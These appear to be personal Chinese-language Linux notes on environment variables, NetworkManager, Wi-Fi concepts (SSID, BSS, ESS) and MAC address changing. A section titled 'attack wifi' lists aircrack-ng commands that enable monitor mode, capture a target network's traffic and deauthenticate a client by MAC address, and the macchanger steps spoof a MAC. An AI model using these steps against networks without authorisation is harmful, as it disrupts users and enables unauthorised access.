### 环境变量

`export` 命令显示当前系统定义的所有环境变量 使用export定义的时候可加双引号也可不加。

`echo $PATH` 命令输出当前的PATH环境变量的值，其中PATH变量定义了运行命令的查找路径，以冒号:分割不同的路径

ex: 

`export PATH=/home/uusama/mysql/bin:$PATH` 

`export PATH=$PATH:/home/uusama/mysql/bin` 

网络管理器运行
`systemctl enable --now NetworkManager` 

### attack wifi

基本上都要加sudo权限

0. `airmon-ng` 看local的网卡 一般就叫wlan0
1. `sudo airmon-ng start wlan0` 开启监听 -- (mac80211 monitor mode vif enabled for [phy4]wlan0 on [phy4]wlan0mon) 就表示监听成功 monitor interface 监听接口就是 wlan0mon
2. `sudo airodump-ng wlan0mon` 
   列出当前所在区域的所有无线网
3. `sudo airodump-ng --bssid[bssid] -c[ch] -w[path] wlan0mon` 
    -c 信道
    -w 路径
5. `aireplay-ng -a[bssid] -c[atkmacid] wlan0mon` 
    -a 目标BSSID
    -c 手机mac地址

__SSID(Service Set Identifier)__ 

无线网名称 也就是服务集标识，其实就是一个集合 也就是下面的ESS 别名也叫ESSID

__BSS__ 

基本服务单元 ，可以理解成一个wifi就是一个基本单元集， WiFi_5G+ 又是另一个服务单元集。一个单元范围有限一般是100米，如果要多个就要拓展 于是就出现了ESS

__ESS(Extend Service Set)__ 

拓展服务集，其实就是多个使用相同SSID的BSS组成，但是这中间隐含2个条件：

    1、这些BSS是要比邻安置。

    2、这些BSS通过各种分布系统互联，有线无线都可以，不过一般都是以太网。
    
ess 由 多个bss组成

[origin](https://forum.huawei.com/enterprise/zh/thread-318127-1-1.html) 
查看网卡Mac地址
`cat /sys/class/net/[网卡名称]/address` 

### 虚拟MAC地址
[origin](https://www.geeksforgeeks.org/how-to-change-the-mac-address-in-kali-linux-using-macchanger/) 
1. `sudo ifconfig [网卡名称] down`
2. `sudo macchanger -r [网卡名称]` --随机生成 -m 指定生成
3. `sudo ifconfig [网卡名称] up`
4. `macchanger -s [网卡名称]`
